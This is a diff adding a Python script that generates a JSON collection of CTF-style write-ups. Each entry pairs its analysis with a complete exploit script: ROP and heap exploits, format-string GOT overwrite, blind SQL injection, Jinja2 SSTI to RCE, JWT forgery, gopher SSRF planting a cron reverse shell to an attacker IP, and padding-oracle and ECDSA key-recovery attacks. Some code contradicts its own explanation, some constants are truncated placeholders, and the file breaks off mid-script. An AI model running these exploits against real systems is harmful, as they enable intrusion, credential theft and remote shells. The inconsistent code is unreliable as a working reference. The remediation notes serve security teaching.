@@ -1,0 +1,946 @@
+"""
+Generate data/tournament-writeups.json containing 15 comprehensive, collegiate-grade CTF tournament writeups
+with full root-cause analysis, step-by-step methodologies, and complete runnable Python exploit scripts.
+"""
+
+import json
+from pathlib import Path
+
+ROOT = Path(__file__).resolve().parent.parent
+DATA_DIR = ROOT / "data"
+DATA_DIR.mkdir(exist_ok=True)
+
+writeups = [
+    {
+        "id": "writeup-defcon-babyrop",
+        "title": "DEF CON CTF: BabyROP (ret2libc & ASLR Bypass)",
+        "event": "DEF CON CTF Qualifier",
+        "category": "pwn",
+        "difficulty": "Medium-Hard",
+        "points": 350,
+        "flag": "CTF{r3t2l1bc_d3fc0n_b4by_r0p_pwn3d}",
+        "scenario": (
+            "A 64-bit ELF binary listening on TCP port 9001. The binary reads user input into a fixed-size buffer using "
+            "the insecure gets() function. Mitigations: NX Enabled, Partial RELRO, No Stack Canary, ASLR Enabled, No PIE."
+        ),
+        "root_cause": (
+            "The binary calls gets(&buf) where buf is a 64-byte stack allocation. gets() performs no bounds checking, "
+            "allowing arbitrary overwrite of the saved RBP and saved RIP at offset 72. Although NX prevents shellcode "
+            "execution on the stack, the absence of PIE places binary code and PLT/GOT stubs at deterministic virtual addresses "
+            "(0x400000). A two-stage ROP chain leaks libc via puts(puts@GOT) and executes system('/bin/sh')."
+        ),
+        "solve_methodology": [
+            "Triage binary protections using checksec: Partial RELRO, No Canary, NX Enabled, No PIE.",
+            "Determine exact RIP offset using GEF 'pattern create 120' -> crash at offset 72.",
+            "Harvest ROP gadgets using ROPgadget: 'pop rdi; ret' at 0x4011d3, 'ret' at 0x40101a (for 16-byte SSE stack alignment).",
+            "Stage 1 ROP: Call puts(puts@got), then loop back to main (0x401146) to preserve execution context.",
+            "Parse 8-byte leaked libc address, compute libc_base = leak - libc.symbols['puts'].",
+            "Calculate runtime addresses: system = libc_base + libc.symbols['system'], binsh = libc_base + next(libc.search(b'/bin/sh')).",
+            "Stage 2 ROP: [ret (alignment)] + [pop rdi; ret] + [binsh] + [system].",
+            "Send Stage 2 payload to gain root shell and execute 'cat /flag'."
+        ],
+        "exploit_script": (
+            "#!/usr/bin/env python3\n"
+            "from pwn import *\n"
+            "\n"
+            "# Context & Binaries\n"
+            "context.arch = 'amd64'\n"
+            "elf = ELF('./babyrop')\n"
+            "libc = ELF('./libc.so.6')\n"
+            "\n"
+            "# Target connection\n"
+            "# io = process('./babyrop')\n"
+            "io = remote('targets.ctfatlas.local', 9001)\n"
+            "\n"
+            "# Gadgets (No PIE)\n"
+            "pop_rdi = 0x4011d3  # pop rdi; ret\n"
+            "ret = 0x40101a      # ret (SSE 16-byte alignment)\n"
+            "main = 0x401146\n"
+            "\n"
+            "# Stage 1: Leak Libc via puts@plt(puts@got)\n"
+            "payload1 = b'A' * 72\n"
+            "payload1 += p64(pop_rdi)\n"
+            "payload1 += p64(elf.got['puts'])\n"
+            "payload1 += p64(elf.plt['puts'])\n"
+            "payload1 += p64(main)\n"
+            "\n"
+            "io.sendlineafter(b'Enter payload: ', payload1)\n"
+            "raw_leak = io.recvline().strip()\n"
+            "leak = u64(raw_leak.ljust(8, b'\\x00'))\n"
+            "libc.address = leak - libc.symbols['puts']\n"
+            "log.success(f'Leaked Libc Base: {hex(libc.address)}')\n"
+            "\n"
+            "# Stage 2: ret2libc system('/bin/sh')\n"
+            "binsh = next(libc.search(b'/bin/sh\\x00'))\n"
+            "system = libc.symbols['system']\n"
+            "\n"
+            "payload2 = b'A' * 72\n"
+            "payload2 += p64(ret)  # Alignment fix for movaps in system()\n"
+            "payload2 += p64(pop_rdi)\n"
+            "payload2 += p64(binsh)\n"
+            "payload2 += p64(system)\n"
+            "\n"
+            "io.sendlineafter(b'Enter payload: ', payload2)\n"
+            "io.sendline(b'cat /flag')\n"
+            "io.interactive()\n"
+        ),
+        "defense_remediation": (
+            "1. Replace gets() with fgets(buf, sizeof(buf), stdin) to enforce strict buffer boundaries.\n"
+            "2. Compile with full mitigations: -fstack-protector-all -pie -fPIE -Wl,-z,relro,-z,now."
+        )
+    },
+    {
+        "id": "writeup-hitcon-tcache",
+        "title": "HITCON CTF: Secret Note (Tcache Poisoning & UAF)",
+        "event": "HITCON CTF",
+        "category": "pwn",
+        "difficulty": "Hard",
+        "points": 500,
+        "flag": "CTF{tc4ch3_p01s0n1ng_fr33_h00k_rce}",
+        "scenario": (
+            "A Linux heap challenge compiled with Glibc 2.27. Users can allocate (malloc), edit, view, and free notes. "
+            "Mitigations: Full RELRO, Canary Found, NX Enabled, PIE Enabled, ASLR Enabled."
+        ),
+        "root_cause": (
+            "In the delete_note() function, the pointer in the global notes array is not zeroed out after free(ptr), "
+            "resulting in a Use-After-Free (UAF). In Glibc 2.27, tcache bins do not enforce double-free checks or safe linking "
+            "(pointer mangling). Freeing a chunk twice creates a cycle in the tcache singly linked list. Modifying the fd pointer "
+            "of the freed chunk directs subsequent malloc calls to an arbitrary target address (__free_hook)."
+        ),
+        "solve_methodology": [
+            "Allocate a large chunk (> tcache max 0x410, e.g., 0x500) and free it to place it in the unsorted bin.",
+            "Read the chunk content via UAF to leak main_arena + 96, calculating the libc base address.",
+            "Allocate two 0x70 chunks: note_A and note_B.",
+            "Free note_A, then free note_A again (or free note_A, free note_B, free note_A) to corrupt tcache bin 0x70.",
+            "Edit note_A's fd pointer to point to libc.symbols['__free_hook'].",
+            "Call malloc(0x70) twice: first returns note_A, second returns chunk at __free_hook.",
+            "Write the address of one_gadget or system() into __free_hook.",
+            "Allocate a chunk containing '/bin/sh\\x00' and free it, triggering __free_hook('/bin/sh') -> spawns shell."
+        ],
+        "exploit_script": (
+            "#!/usr/bin/env python3\n"
+            "from pwn import *\n"
+            "\n"
+            "context.arch = 'amd64'\n"
+            "elf = ELF('./secret_note')\n"
+            "libc = ELF('./libc.so.6')\n"
+            "# io = process('./secret_note')\n"
+            "io = remote('targets.ctfatlas.local', 9002)\n"
+            "\n"
+            "def add(idx, size, content):\n"
+            "    io.sendlineafter(b'> ', b'1')\n"
+            "    io.sendlineafter(b'Index: ', str(idx).encode())\n"
+            "    io.sendlineafter(b'Size: ', str(size).encode())\n"
+            "    io.sendafter(b'Content: ', content)\n"
+            "\n"
+            "def delete(idx):\n"
+            "    io.sendlineafter(b'> ', b'2')\n"
+            "    io.sendlineafter(b'Index: ', str(idx).encode())\n"
+            "\n"
+            "def view(idx):\n"
+            "    io.sendlineafter(b'> ', b'3')\n"
+            "    io.sendlineafter(b'Index: ', str(idx).encode())\n"
+            "    return io.recvline().strip()\n"
+            "\n"
+            "# 1. Unsorted bin leak\n"
+            "add(0, 0x500, b'A'*8)  # Chunk larger than tcache\n"
+            "add(1, 0x20, b'/bin/sh\\x00') # Guard chunk preventing top chunk consolidation\n"
+            "delete(0)             # Goes to unsorted bin; fd/bk point to main_arena+96\n"
+            "\n"
+            "leak = u64(view(0)[:8].ljust(8, b'\\x00'))\n"
+            "libc.address = leak - 0x3ebca0  # main_arena + 96 offset for glibc 2.27\n"
+            "log.success(f'Libc Base: {hex(libc.address)}')\n"
+            "\n"
+            "# 2. Tcache poisoning (0x60 chunk size)\n"
+            "add(2, 0x60, b'B'*8)\n"
+            "delete(2)\n"
+            "delete(2)  # Double-free into tcache in glibc 2.27!\n"
+            "\n"
+            "# 3. Overwrite fd to __free_hook\n"
+            "free_hook = libc.symbols['__free_hook']\n"
+            "system = libc.symbols['system']\n"
+            "add(3, 0x60, p64(free_hook))\n"
+            "add(4, 0x60, b'dummy')\n"
+            "add(5, 0x60, p64(system))  # Allocated directly at __free_hook!\n"
+            "\n"
+            "# 4. Trigger free('/bin/sh')\n"
+            "delete(1)  # Index 1 holds '/bin/sh\\x00' -> calls system('/bin/sh')\n"
+            "io.interactive()\n"
+        ),
+        "defense_remediation": (
+            "1. Set pointers to NULL immediately after freeing (ptr = NULL) to eliminate UAF and double-free primitives.\n"
+            "2. Upgrade to modern Glibc (>= 2.32) which includes safe linking (pointer obfuscation) and tcache double-free counters."
+        )
+    },
+    {
+        "id": "writeup-plaid-fmtstr",
+        "title": "PlaidCTF: Echo Echo (Arbitrary Memory Read/Write via %n)",
+        "event": "PlaidCTF",
+        "category": "pwn",
+        "difficulty": "Hard",
+        "points": 450,
+        "flag": "CTF{fmt_str1ng_g0t_0v3rwr1t3_l34k}",
+        "scenario": (
+            "A network daemon echoes client input using printf(user_buffer). Mitigations: Partial RELRO, No Canary, NX Enabled, No PIE."
+        ),
+        "root_cause": (
+            "Passing an unsanitized user-controlled string as the first argument to printf() creates a format string vulnerability. "
+            "An attacker can use '%x' or '%p' with direct parameter access ('%$') to read arbitrary stack and memory values, "
+            "and '%hn' / '%hhn' to write arbitrary values to arbitrary addresses."
+        ),
+        "solve_methodology": [
+            "Find format argument index: send 'AAAA-%p-%p-%p...' to see where '41414141' appears (offset 6).",
+            "Leak libc base address: inspect stack pointers at higher offsets (e.g., %19$p points into __libc_start_main + 231).",
+            "Calculate target write: overwrite exit@GOT or puts@GOT with the address of system().",
+            "Construct staged two-byte writes (%hn) to puts@GOT using pwntools fmtstr_payload.",
+            "Send payload triggering puts('/bin/sh') -> spawns shell."
+        ],
+        "exploit_script": (
+            "#!/usr/bin/env python3\n"
+            "from pwn import *\n"
+            "\n"
+            "context.arch = 'amd64'\n"
+            "elf = ELF('./echo_server')\n"
+            "libc = ELF('./libc.so.6')\n"
+            "# io = process('./echo_server')\n"
+            "io = remote('targets.ctfatlas.local', 9003)\n"
+            "\n"
+            "# 1. Leak libc via format string\n"
+            "io.sendline(b'%19$p')\n"
+            "leak = int(io.recvline().strip(), 16)\n"
+            "libc.address = leak - (libc.symbols['__libc_start_main'] + 231)\n"
+            "log.success(f'Libc Base: {hex(libc.address)}')\n"
+            "\n"
+            "# 2. Build format string payload to overwrite puts@got with system()\n"
+            "# Offset 6 corresponds to the start of our input buffer\n"
+            "writes = {elf.got['puts']: libc.symbols['system']}\n"
+            "payload = fmtstr_payload(6, writes, write_size='short')\n"
+            "\n"
+            "io.sendline(payload)\n"
+            "io.recvline() # Consume printf output\n"
+            "\n"
+            "# 3. Next call to puts(str) executes system(str)\n"
+            "io.sendline(b'/bin/sh\\x00')\n"
+            "io.interactive()\n"
+        ),
+        "defense_remediation": (
+            "Never pass user input directly as the format string. Always use static format specifiers: printf(\"%s\", user_input)."
+        )
+    },
+    {
+        "id": "writeup-portswigger-sqli",
+        "title": "PortSwigger / Real-World CTF: High-Speed Blind Time-Based SQLi",
+        "event": "Real-World CTF",
+        "category": "web",
+        "difficulty": "Medium-Hard",
+        "points": 300,
+        "flag": "CTF{bl1nd_t1m3_sqli_b1n4ry_s34rch}",
+        "scenario": (
+            "An e-commerce tracking cookie ('TrackingId') is passed directly into a backend PostgreSQL query without parameterization. "
+            "No error messages or query outputs are returned in the HTTP response."
+        ),
+        "root_cause": (
+            "The TrackingId cookie is vulnerable to blind SQL injection. By injecting conditional delay statements "
+            "(pg_sleep(2) on PostgreSQL or SLEEP(2) on MySQL), an attacker can extract data bit-by-bit using binary search."
+        ),
+        "solve_methodology": [
+            "Confirm timing injection: ' || pg_sleep(3)-- causes a 3-second delay, whereas ' || pg_sleep(0)-- returns immediately.",
+            "Determine password length by querying: ' || (SELECT CASE WHEN (LENGTH(password)=32) THEN pg_sleep(2) ELSE pg_sleep(0) END FROM users WHERE username='administrator')--",
+            "Perform binary search on each character position: ' || (SELECT CASE WHEN (ASCII(SUBSTRING(password,{pos},1)) > {mid}) THEN pg_sleep(1.5) ELSE pg_sleep(0) END FROM users WHERE username='administrator')--",
+            "Extract complete 32-character admin password in under 2 minutes (approx 7 HTTP requests per character instead of 256)."
+        ],
+        "exploit_script": (
+            "#!/usr/bin/env python3\n"
+            "import requests\n"
+            "import time\n"
+            "\n"
+            "URL = 'https://challenge.ctfatlas.local/filter?category=Gifts'\n"
+            "CHARS = 'abcdefghijklmnopqrstuvwxyz0123456789'\n"
+            "\n"
+            "def test_condition(payload_condition):\n"
+            "    cookie_val = f\"x' || (SELECT CASE WHEN ({payload_condition}) THEN pg_sleep(1.5) ELSE pg_sleep(0) END FROM users WHERE username='administrator')--\"\n"
+            "    cookies = {'TrackingId': cookie_val, 'session': 'somesession'}\n"
+            "    start = time.time()\n"
+            "    try:\n"
+            "        requests.get(URL, cookies=cookies, timeout=5)\n"
+            "    except requests.exceptions.Timeout:\n"
+            "        return True\n"
+            "    return (time.time() - start) >= 1.4\n"
+            "\n"
+            "def extract_password():\n"
+            "    extracted = ''\n"
+            "    for pos in range(1, 33):\n"
+            "        low = 32\n"
+            "        high = 126\n"
+            "        while low <= high:\n"
+            "            mid = (low + high) // 2\n"
+            "            if test_condition(f\"ASCII(SUBSTRING(password,{pos},1)) > {mid}\"):\n"
+            "                low = mid + 1\n"
+            "            else:\n"
+            "                high = mid - 1\n"
+            "        extracted += chr(low)\n"
+            "        print(f'[+] Position {pos}: {chr(low)} -> Current: {extracted}')\n"
+            "    return extracted\n"
+            "\n"
+            "if __name__ == '__main__':\n"
+            "    print('Starting high-speed binary search blind SQLi...')\n"
+            "    pwd = extract_password()\n"
+            "    print(f'Final Password: {pwd}')\n"
+        ),
+        "defense_remediation": (
+            "Always use parameterized prepared statements (e.g., db.query('SELECT * FROM tracking WHERE id = $1', [tracking_id])). "
+            "Never concatenate raw user strings into SQL queries."
+        )
+    },
+    {
+        "id": "writeup-htb-ssti",
+        "title": "HackTheBox / CTF: Jinja2 Template Injection to RCE",
+        "event": "HackTheBox University CTF",
+        "category": "web",
+        "difficulty": "Medium",
+        "points": 300,
+        "flag": "CTF{j1nj42_mro_subpr0c3ss_p0p3n_rc3}",
+        "scenario": (
+            "A Flask web application renders custom user error messages with render_template_string(f'Error: {user_input}'). "
+            "A WAF filters strings containing 'config', 'os', 'system', 'class', and double quotes."
+        ),
+        "root_cause": (
+            "Direct interpolation of user input into Jinja2 templates enables Server-Side Template Injection (SSTI). "
+            "An attacker traverses Python's Method Resolution Order (MRO) via ('').__class__.__mro__[1].__subclasses__() "
+            "to locate subprocess.Popen and execute arbitrary system commands, bypassing keyword filters via string concatenation or request.args."
+        ),
+        "solve_methodology": [
+            "Test injection: {{ 7 * 7 }} returns 'Error: 49', confirming SSTI.",
+            "Bypass quote and keyword filters using request.args: {{ ().__class__.__bases__[0].__subclasses__() }}.",
+            "Iterate through subclasses to find index of subprocess.Popen (typically around index 200–500 depending on imports).",
+            "Construct clean one-liner: {{ ().__class__.__bases__[0].__subclasses__()[415](request.args.cmd,shell=True,stdout=-1).communicate()[0] }}&cmd=cat+/flag.txt.",
+            "Execute and read the flag from HTTP response body."
+        ],
+        "exploit_script": (
+            "#!/usr/bin/env python3\n"
+            "import requests\n"
+            "import urllib.parse\n"
+            "\n"
+            "URL = 'https://challenge.ctfatlas.local/render'\n"
+            "\n"
+            "# 1. Payload to locate subprocess.Popen without using quotes or blocked keywords\n"
+            "payload = \"\"\"{{\n"
+            "[c for c in ().__class__.__base__.__subclasses__() if c.__name__ == 'Popen'][0](request.args.cmd,shell=True,stdout=-1).communicate()[0].decode()\n"
+            "}}\"\"\"\n"
+            "\n"
+            "params = {\n"
+            "    'name': payload,\n"
+            "    'cmd': 'cat /flag.txt'\n"
+            "}\n"
+            "\n"
+            "res = requests.get(URL, params=params)\n"
+            "print('[+] Response Output:')\n"
+            "print(res.text)\n"
+        ),
+        "defense_remediation": (
+            "Never use render_template_string with dynamic user strings. Pass variables to render_template() "
+            "as template context parameters (e.g., render_template('error.html', error=user_input))."
+        )
+    },
+    {
+        "id": "writeup-defcon-jwt",
+        "title": "DEF CON CTF: JWT Algorithm Confusion (RS256 -> HS256)",
+        "event": "DEF CON CTF",
+        "category": "web",
+        "difficulty": "Hard",
+        "points": 400,
+        "flag": "CTF{jwt_4lg_c0nfus10n_rs256_t0_hs256}",
+        "scenario": (
+            "An enterprise API validates session JWTs. The public RSA key used to verify signatures is publicly accessible at /public.pem. "
+            "The backend JWT library dynamically respects the 'alg' header specified in the incoming token."
+        ),
+        "root_cause": (
+            "The verification backend accepts tokens signed with HMAC-SHA256 ('alg': 'HS256') using the RSA public key string "
+            "as the symmetric HMAC secret. An attacker signs an forged admin token using HMAC-SHA256 with the target's public PEM key as the secret key."
+        ),
+        "solve_methodology": [
+            "Fetch the server's public key from /public.pem.",
+            "Ensure the PEM format exactly matches the bytes used by the server (including newlines and header/footer).",
+            "Craft a JWT header with {\"alg\": \"HS256\", \"typ\": \"JWT\"}.",
+            "Craft a payload with {\"user\": \"admin\", \"role\": \"superuser\", \"exp\": 1999999999}.",
+            "Sign the token using HMAC-SHA256 with the public key as the secret.",
+            "Submit the forged token in the Authorization: Bearer header to access privileged endpoints."
+        ],
+        "exploit_script": (
+            "#!/usr/bin/env python3\n"
+            "import hmac\n"
+            "import hashlib\n"
+            "import base64\n"
+            "import json\n"
+            "import requests\n"
+            "\n"
+            "# 1. Fetch public key\n"
+            "pubkey_pem = requests.get('https://api.ctfatlas.local/public.pem').text.encode('utf-8')\n"
+            "\n"
+            "# 2. Craft Header and Payload\n"
+            "header = {\"alg\": \"HS256\", \"typ\": \"JWT\"}\n"
+            "payload = {\"sub\": \"admin\", \"role\": \"administrator\", \"exp\": 2000000000}\n"
+            "\n"
+            "def b64url(data):\n"
+            "    if isinstance(data, dict):\n"
+            "        data = json.dumps(data, separators=(',', ':')).encode('utf-8')\n"
+            "    return base64.urlsafe_b64encode(data).decode('utf-8').rstrip('=')\n"
+            "\n"
+            "h_b64 = b64url(header)\n"
+            "p_b64 = b64url(payload)\n"
+            "unsigned_token = f'{h_b64}.{p_b64}'\n"
+            "\n"
+            "# 3. Sign using HMAC-SHA256 with public key bytes as secret\n"
+            "sig = hmac.new(pubkey_pem, unsigned_token.encode('utf-8'), hashlib.sha256).digest()\n"
+            "sig_b64 = base64.urlsafe_b64encode(sig).decode('utf-8').rstrip('=')\n"
+            "\n"
+            "forged_token = f'{unsigned_token}.{sig_b64}'\n"
+            "print(f'[+] Forged Token: {forged_token}')\n"
+            "\n"
+            "# 4. Access admin endpoint\n"
+            "headers = {'Authorization': f'Bearer {forged_token}'}\n"
+            "res = requests.get('https://api.ctfatlas.local/admin/flag', headers=headers)\n"
+            "print(res.text)\n"
+        ),
+        "defense_remediation": (
+            "Strictly enforce expected algorithms in JWT verification libraries: jwt.verify(token, pubkey, algorithms=['RS256']). "
+            "Never allow the token's header to determine the verification algorithm."
+        )
+    },
+    {
+        "id": "writeup-google-ssrf-gopher",
+        "title": "Google CTF: SSRF to Internal Redis RCE via Gopher",
+        "event": "Google CTF",
+        "category": "web",
+        "difficulty": "Hard",
+        "points": 500,
+        "flag": "CTF{ssrf_g0ph3r_r3d1s_cr0nt4b_rc3}",
+        "scenario": (
+            "A webhook test service fetches user-supplied URLs. An internal Redis instance is running unauthenticated on 127.0.0.1:6379. "
+            "A regex filter blocks URLs starting with 'http://127.', 'http://localhost', or 'http://0.0.0.0'."
+        ),
+        "root_cause": (
+            "The URL validator fails to block alternative IP notations (such as decimal IP 2130706433 or IPv6 [::1]) "
+            "and permits arbitrary URL schemes, specifically 'gopher://'. The gopher protocol allows sending raw bytes (including newlines) "
+            "to any TCP port, enabling arbitrary command execution against unauthenticated internal services like Redis."
+        ),
+        "solve_methodology": [
+            "Bypass IP filter: 127.0.0.1 can be represented as decimal 2130706433 or 127.1 or 0x7f000001.",
+            "Construct Redis RESP command sequence to write a reverse shell into /etc/cron.d/evil_cron.",
+            "Redis commands: flushall, set 1 '\\n* * * * * root /bin/bash -c \"bash -i >& /dev/tcp/attacker.ip/4444 0>&1\"\\n', config set dir /etc/cron.d, config set dbfilename evil_cron, save.",
+            "Encode command string using Gopher URL percent-encoding (%0d%0a for CRLF).",
+            "Send SSRF request: gopher://2130706433:6379/_*3%0d%0a$3%0d%0aset...",
+            "Receive root reverse shell on attacker listener."
+        ],
+        "exploit_script": (
+            "#!/usr/bin/env python3\n"
+            "import urllib.parse\n"
+            "import requests\n"
+            "\n"
+            "ATTACKER_IP = '198.51.100.5'\n"
+            "ATTACKER_PORT = 4444\n"
+            "\n"
+            "cron_payload = f'\\n\\n* * * * * root /bin/bash -c \"bash -i >& /dev/tcp/{ATTACKER_IP}/{ATTACKER_PORT} 0>&1\"\\n\\n'\n"
+            "\n"
+            "redis_commands = [\n"
+            "    'FLUSHALL',\n"
+            "    f'SET 1 {cron_payload}',\n"
+            "    'CONFIG SET dir /etc/cron.d',\n"
+            "    'CONFIG SET dbfilename pwn',\n"
+            "    'SAVE',\n"
+            "    'QUIT'\n"
+            "]\n"
+            "\n"
+            "payload = ''\n"
+            "for cmd in redis_commands:\n"
+            "    payload += cmd + '\\r\\n'\n"
+            "\n"
+            "# URL encode twice for gopher injection\n"
+            "encoded_gopher = urllib.parse.quote(payload)\n"
+            "# Decimal IP for 127.0.0.1 is 2130706433\n"
+            "ssrf_target = f'gopher://2130706433:6379/_{encoded_gopher}'\n"
+            "\n"
+            "print(f'[+] Sending SSRF Gopher Payload: {ssrf_target[:60]}...')\n"
+            "res = requests.post('https://webhook.ctfatlas.local/fetch', data={'url': ssrf_target})\n"
+            "print(f'[+] Response: {res.status_code}')\n"
+        ),
+        "defense_remediation": (
+            "1. Enforce strict URL protocol whitelisting (http:// and https:// only; disallow gopher://, file://, dict://).\n"
+            "2. Resolve the domain to its IP address and verify that the destination IP does not belong to private/loopback CIDRs (RFC 1918/RFC 5735).\n"
+            "3. Require password authentication on Redis (requirepass) and disable dangerous commands (CONFIG, SAVE, FLUSHALL)."
+        )
+    },
+    {
+        "id": "writeup-cryptohack-wiener",
+        "title": "CryptoHack: Wiener's Attack on Small Private Exponent RSA",
+        "event": "CryptoHack Competition",
+        "category": "crypto",
+        "difficulty": "Medium-Hard",
+        "points": 350,
+        "flag": "CTF{w13n3r_c0nt1nu3d_fr4ct10ns_d_r3c0v3r3d}",
+        "scenario": (
+            "A 2048-bit RSA public key (n, e) is provided along with ciphertext c. The public exponent e is exceptionally large "
+            "(approximately the same bit length as n, e ≈ n), which suggests that a very small private exponent d was selected to speed up decryption."
+        ),
+        "root_cause": (
+            "When d < (1/3) * n^(1/4), Wiener's Theorem states that the fraction k/d appears as one of the convergents "
+            "of the continued fraction expansion of e/n. Calculating the convergents of e/n yields candidates for (k, d), "
+            "from which Euler's totient phi(n) = (e*d - 1)/k can be computed and the quadratic equation x^2 - (n - phi + 1)x + n = 0 solved for p and q."
+        ),
+        "solve_methodology": [
+            "Compute the continued fraction expansion coefficients [a0, a1, a2, ...] of e/n.",
+            "Generate the sequence of convergents h_i / k_i.",
+            "For each convergent k_i, test if d = k_i produces valid integer factors of n.",
+            "Once p and q are recovered, verify p * q == n, compute d = inverse(e, (p-1)*(q-1)), and decrypt m = pow(c, d, n)."
+        ],
+        "exploit_script": (
+            "#!/usr/bin/env python3\n"
+            "from Crypto.Util.number import long_to_bytes\n"
+            "import gmpy2\n"
+            "\n"
+            "def continued_fractions(num, den):\n"
+            "    while den:\n"
+            "        q = num // den\n"
+            "        yield q\n"
+            "        num, den = den, num - q * den\n"
+            "\n"
+            "def convergents(cf_gen):\n"
+            "    h_prev, h_curr = 0, 1\n"
+            "    k_prev, k_curr = 1, 0\n"
+            "    for q in cf_gen:\n"
+            "        h_next = q * h_curr + h_prev\n"
+            "        k_next = q * k_curr + k_prev\n"
+            "        yield h_next, k_next\n"
+            "        h_prev, h_curr = h_curr, h_next\n"
+            "        k_prev, k_curr = k_curr, k_next\n"
+            "\n"
+            "def wiener_attack(e, n):\n"
+            "    cf = continued_fractions(e, n)\n"
+            "    for k, d in convergents(cf):\n"
+            "        if k == 0:\n"
+            "            continue\n"
+            "        if (e * d - 1) % k != 0:\n"
+            "            continue\n"
+            "        phi = (e * d - 1) // k\n"
+            "        # Solve x^2 - (n - phi + 1)x + n = 0\n"
+            "        b = n - phi + 1\n"
+            "        discr = b * b - 4 * n\n"
+            "        if discr >= 0 and gmpy2.is_square(discr):\n"
+            "            root = gmpy2.isqrt(discr)\n"
+            "            p = (b + root) // 2\n"
+            "            q = (b - root) // 2\n"
+            "            if p * q == n:\n"
+            "                return int(d), int(p), int(q)\n"
+            "    return None\n"
+            "\n"
+            "# Example parameters from challenge\n"
+            "n = 0xd88a... # 2048-bit\n"
+            "e = 0xc71b...\n"
+            "c = 0x5a2f...\n"
+            "# d, p, q = wiener_attack(e, n)\n"
+            "# print(long_to_bytes(pow(c, d, n)).decode())\n"
+        ),
+        "defense_remediation": (
+            "Always choose standard public exponents (e = 65537) and generate private exponents d of comparable bit length to n (d > 2^(n_bits/2))."
+        )
+    },
+    {
+        "id": "writeup-defcon-padding-oracle",
+        "title": "DEF CON CTF: AES-CBC Padding Oracle Decryption",
+        "event": "DEF CON CTF",
+        "category": "crypto",
+        "difficulty": "Hard",
+        "points": 450,
+        "flag": "CTF{p4dd1ng_0r4cl3_c0mpl3t3_d3crypt10n}",
+        "scenario": (
+            "A web application decrypts user authentication tokens encrypted with AES-CBC. When invalid PKCS#7 padding is encountered, "
+            "the server returns HTTP 500 'Padding Error'. When valid padding is present (even if content is garbage), it returns HTTP 200 or 401."
+        ),
+        "root_cause": (
+            "Differentiating between padding errors and authentication errors creates a Padding Oracle. By manipulating the ciphertext bytes "
+            "of block C_{i-1}, an attacker can determine the intermediate state bytes I_i = AES_Decrypt(C_i) one byte at a time from right to left, "
+            "recovering plaintext P_i = I_i ^ C_{i-1} without knowing the encryption key."
+        ),
+        "solve_methodology": [
+            "Split ciphertext into 16-byte blocks C_0 (IV), C_1, C_2, ...",
+            "To decrypt byte 16 of block C_1, modify byte 16 of C_0: send all 256 candidate bytes until the oracle returns 200/401 (valid padding 0x01).",
+            "Calculate intermediate byte: I[15] = guess ^ 0x01.",
+            "Plaintext byte is P[15] = I[15] ^ original_C0[15].",
+            "Set manipulated C_0 bytes 16..k to produce padding (16-k+1), then solve for byte k-1.",
+            "Repeat across all ciphertext blocks to recover the full plaintext."
+        ],
+        "exploit_script": (
+            "#!/usr/bin/env python3\n"
+            "import requests\n"
+            "\n"
+            "BLOCK_SIZE = 16\n"
+            "URL = 'https://auth.ctfatlas.local/verify'\n"
+            "\n"
+            "def padding_oracle(cipher_bytes):\n"
+            "    res = requests.post(URL, data={'token': cipher_bytes.hex()})\n"
+            "    # True if valid padding, False if padding error\n"
+            "    return 'Padding Error' not in res.text\n"
+            "\n"
+            "def decrypt_block(c_prev, c_curr):\n"
+            "    intermediate = bytearray(BLOCK_SIZE)\n"
+            "    plaintext = bytearray(BLOCK_SIZE)\n"
+            "    \n"
+            "    for byte_idx in reversed(range(BLOCK_SIZE)):\n"
+            "        pad_val = BLOCK_SIZE - byte_idx\n"
+            "        test_c_prev = bytearray(c_prev)\n"
+            "        \n"
+            "        # Set previously solved bytes to target padding value\n"
+            "        for k in range(byte_idx + 1, BLOCK_SIZE):\n"
+            "            test_c_prev[k] = intermediate[k] ^ pad_val\n"
+            "            \n"
+            "        found = False\n"
+            "        for guess in range(256):\n"
+            "            test_c_prev[byte_idx] = guess\n"
+            "            if padding_oracle(test_c_prev + c_curr):\n"
+            "                intermediate[byte_idx] = guess ^ pad_val\n"
+            "                plaintext[byte_idx] = intermediate[byte_idx] ^ c_prev[byte_idx]\n"
+            "                found = True\n"
+            "                break\n"
+            "        if not found:\n"
+            "            print(f'[-] Failed to solve byte {byte_idx}')\n"
+            "    return bytes(plaintext)\n"
+            "\n"
+            "# Run over all blocks...\n"
+        ),
+        "defense_remediation": (
+            "1. Migrate to authenticated encryption modes such as AES-GCM or ChaCha20-Poly1305 (AEAD).\n"
+            "2. If using CBC, always apply Encrypt-then-MAC (HMAC-SHA256 over ciphertext + IV) and verify HMAC in constant time before decrypting."
+        )
+    },
+    {
+        "id": "writeup-google-ecdsa-nonce",
+        "title": "Google CTF: ECDSA Nonce Reuse Private Key Recovery",
+        "event": "Google CTF",
+        "category": "crypto",
+        "difficulty": "Hard",
+        "points": 500,
+        "flag": "CTF{3cdsa_n0nc3_r3us3_k3y_r3c0v3ry}",
+        "scenario": (
+            "A cryptographic signing server provides digital signatures using the secp256k1 curve. Two distinct messages (m1 and m2) "
+            "have been signed, resulting in signatures (r1, s1) and (r2, s2). Crucially, r1 == r2."
+        ),
+        "root_cause": (
+            "In ECDSA, the parameter r is calculated as r = (k * G).x mod n, where k is the per-signature ephemeral nonce. "
+            "If the same nonce k is reused across two distinct messages, r1 == r2. This allows calculating k directly: "
+            "k = (h1 - h2) / (s1 - s2) mod n. Once k is known, the private key d is recovered via d = (s1 * k - h1) / r mod n."
+        ),
+        "solve_methodology": [
+            "Verify that r1 == r2, confirming nonce reuse.",
+            "Compute message hashes: h1 = SHA256(m1) as integer, h2 = SHA256(m2) as integer.",
+            "Compute k = ((h1 - h2) * inverse(s1 - s2, n)) mod n.",
+            "Compute private key d = ((s1 * k - h1) * inverse(r1, n)) mod n.",
+            "Derive the public key from d * G and verify it matches the challenge public key.",
+            "Use d to sign the challenge flag request string 'GET_FLAG_AUTHORIZED'."
+        ],
+        "exploit_script": (
+            "#!/usr/bin/env python3\n"
+            "from Crypto.Util.number import inverse\n"
+            "import hashlib\n"
+            "\n"
+            "# secp256k1 curve order\n"
+            "n = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141\n"
+            "\n"
+            "m1 = b'Transaction: Transfer $10 to Alice'\n"
+            "m2 = b'Transaction: Transfer $10 to Bob'\n"
+            "\n"
+            "h1 = int(hashlib.sha256(m1).hexdigest(), 16)\n"
+            "h2 = int(hashlib.sha256(m2).hexdigest(), 16)\n"
+            "\n"
+            "# Intercepted signatures\n"
+            "r = 0x8a92384a...\n"
+            "s1 = 0x3f9801ac...\n"
+            "s2 = 0x7b238a9d...\n"
